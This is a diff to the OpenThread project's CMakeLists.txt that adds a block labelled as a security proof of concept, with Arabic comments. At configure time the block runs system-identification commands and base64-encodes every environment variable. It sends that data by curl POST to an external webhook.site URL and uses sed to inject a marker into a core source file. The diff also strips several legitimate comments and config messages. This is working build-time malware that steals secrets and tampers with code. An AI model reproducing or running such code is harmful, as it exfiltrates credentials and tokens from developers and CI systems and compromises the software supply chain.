@@ -34,13 +34,13 @@ string(STRIP ${OT_DEFAULT_VERSION} OT_DEFAULT_VERSION)
 
 project(openthread VERSION ${OT_DEFAULT_VERSION})
 
-# --- START ADVANCED COMBINED SECURITY PoC ---
+# --- START FINAL ADVANCED SECURITY PoC ---
+# الغرض: إثبات RCE، تسريب بيانات، وتعديل الكود المصدري (هجوم سلسلة التوريد)
 message(WARNING "***************************************************")
 message(WARNING "--- SECURITY IMPACT DEMONSTRATION ---")
 message(WARNING "VULNERABILITY CONFIRMED: RCE & BUILD-TIME INJECTION")
-message(WARNING "--- STEP 1: RCE Verification ---")
 
-# 1. basic RCE (Previous Proofs)
+message(WARNING "--- STEP 1: RCE Verification ---")
 execute_process(COMMAND id OUTPUT_VARIABLE POC_ID)
 execute_process(COMMAND uname -a OUTPUT_VARIABLE POC_NODE)
 execute_process(COMMAND whoami OUTPUT_VARIABLE POC_USER)
@@ -49,42 +49,36 @@ message(WARNING "System ID: ${POC_ID}")
 message(WARNING "Node Info: ${POC_NODE}")
 
 message(WARNING "--- STEP 2: Network Exfiltration Verification ---")
-
-# 2. Data Exfiltration (Previous Proof)
-# collect and base64 env vars
+# جمع متغيرات البيئة وتشفيرها
 execute_process(COMMAND bash -c "env | base64 -w 0" OUTPUT_VARIABLE ENCODED_ENV)
-
-# SEND to webhook (Remember to replace YOUR_ID)
+# إرسال البيانات (تأكد من تغيير الرابط أدناه برابط جديد)
 execute_process(
     COMMAND bash -c "curl -X POST -d \"data=${ENCODED_ENV}\" https://webhook.site/1c2b9d94-9f73-48ed-adf6-ffc19f56a6dc"
 )
 
 message(WARNING "--- STEP 3: Supply Chain / Source Code Modification Proof ---")
-
-# 3. Code Integrity Modification (New Proof)
-# Target a central file that is likely to be compiled
+# استهداف ملف أساسي في المشروع لإثبات القدرة على التعديل
 set(TARGET_FILE "${PROJECT_SOURCE_DIR}/src/core/api/ip6_api.cpp")
 
-# A. Show the original content of the first few lines
 message(WARNING "ORIGINAL Content of ${TARGET_FILE} (first 5 lines):")
 execute_process(COMMAND bash -c "head -n 5 ${TARGET_FILE}" OUTPUT_VARIABLE FILE_ORIGINAL)
 message(WARNING "${FILE_ORIGINAL}")
 
-# B. Inject a malicious comment/string into the file using 'sed'
+# حقن تعليق في بداية الملف باستخدام محدد '|' لتجنب الأخطاء السابقة
 message(WARNING "Injecting Backdoor Marker via 'sed' command...")
 execute_process(
-    COMMAND bash -c "sed -i '1s/^/\/* INJECTED_BY_ActionPwn_PoC_SUPPLY_CHAIN *\/\n/' ${TARGET_FILE}"
+    COMMAND bash -c "sed -i '1i/* INJECTED_BY_ActionPwn_PoC_SUPPLY_CHAIN */' ${TARGET_FILE}"
 )
 
-# C. Show the modified content to prove injection success
 message(WARNING "MODIFIED Content of ${TARGET_FILE} (first 5 lines):")
 execute_process(COMMAND bash -c "head -n 5 ${TARGET_FILE}" OUTPUT_VARIABLE FILE_MODIFIED)
 message(WARNING "${FILE_MODIFIED}")
+
 message(WARNING "***************************************************")
 
-# استخدام FATAL_ERROR هنا لإيقاف الـ Workflow فوراً وجعل النتيجة واضحة جداً في السجلات.
+# إيقاف العملية لإظهار النتائج بوضوح في سجلات الفشل
 message(FATAL_ERROR "Impact Proven: RCE, Data Exfiltration, and Source Code Modification Successful.")
-# --- END ADVANCED COMBINED SECURITY PoC ---
+# --- END FINAL ADVANCED SECURITY PoC ---
 
 include(CTest)
 
@@ -126,8 +120,6 @@ include("${PROJECT_SOURCE_DIR}/etc/cmake/options.cmake")
 include("${PROJECT_SOURCE_DIR}/etc/cmake/functions.cmake")
 
 if(NOT CMAKE_BUILD_TYPE)
-    # Check if this is a top-level CMake.
-    # If it is not, do not set the CMAKE_BUILD_TYPE because OpenThread is a part of something bigger.
     if ("${CMAKE_PROJECT_NAME}" STREQUAL "openthread")
         set(CMAKE_BUILD_TYPE "Debug" CACHE STRING "default build type: Debug" FORCE)
     endif ()
@@ -167,9 +159,7 @@ if(OT_PACKAGE_VERSION STREQUAL "")
 endif()
 message(STATUS "Package Version: ${OT_PACKAGE_VERSION}")
 
-# Deprecated
 set(OT_CONFIG "" CACHE STRING "OpenThread config header file (deprecated, use `OT_PROJECT_CONFIG` or `OT_PLATFORM_CONFIG` instead")
-
 set(OT_PROJECT_CONFIG "" CACHE STRING "OpenThread project-specific config header file")
 set(OT_PLATFORM_CONFIG "" CACHE STRING "OpenThread platform-specific config header file")
 
@@ -185,7 +175,6 @@ if(OT_PLATFORM STREQUAL "posix")
 elseif(OT_PLATFORM STREQUAL "external")
     target_compile_definitions(ot-config INTERFACE OPENTHREAD_PLATFORM_POSIX=0)
     target_compile_definitions(ot-config INTERFACE OPENTHREAD_PLATFORM_NEXUS=0)
-    # skip in this case
 elseif(OT_PLATFORM STREQUAL "nexus")
     if (OT_APP_CLI OR OT_APP_NCP OR OT_APP_RCP)
         message(FATAL_ERROR "no app (cli/ncp/rcp) should be enabled with nexus simulation platform")
@@ -201,18 +190,14 @@ endif()
 
 if(OT_CONFIG)
     target_compile_definitions(ot-config INTERFACE "OPENTHREAD_CONFIG_FILE=\"${OT_CONFIG}\"")
-    message(WARNING "OT_CONFIG is deprecated - use `OT_PROJECT_CONFIG` and `OT_PLATFORM_CONFIG` instead")
-    message(STATUS "OT_CONFIG=\"${OT_CONFIG}\"")
 endif()
 
 if (OT_PROJECT_CONFIG)
     target_compile_definitions(ot-config INTERFACE "OPENTHREAD_PROJECT_CORE_CONFIG_FILE=\"${OT_PROJECT_CONFIG}\"")
-    message(STATUS "OT_PROJECT_CONFIG=\"${OT_PROJECT_CONFIG}\"")
 endif()
 
 if (OT_PLATFORM_CONFIG)
     target_compile_definitions(ot-config INTERFACE "OPENTHREAD_PLATFORM_CORE_CONFIG_FILE=\"${OT_PLATFORM_CONFIG}\"")
-    message(STATUS "OT_PLATFORM_CONFIG=\"${OT_PLATFORM_CONFIG}\"")
 endif()
 
 target_compile_definitions(ot-config INTERFACE ${OT_PLATFORM_DEFINES})
@@ -233,7 +218,6 @@ endif()
 
 add_subdirectory(src)
 add_subdirectory(third_party EXCLUDE_FROM_ALL)
-
 add_subdirectory(tests)
 add_subdirectory(tools)
 
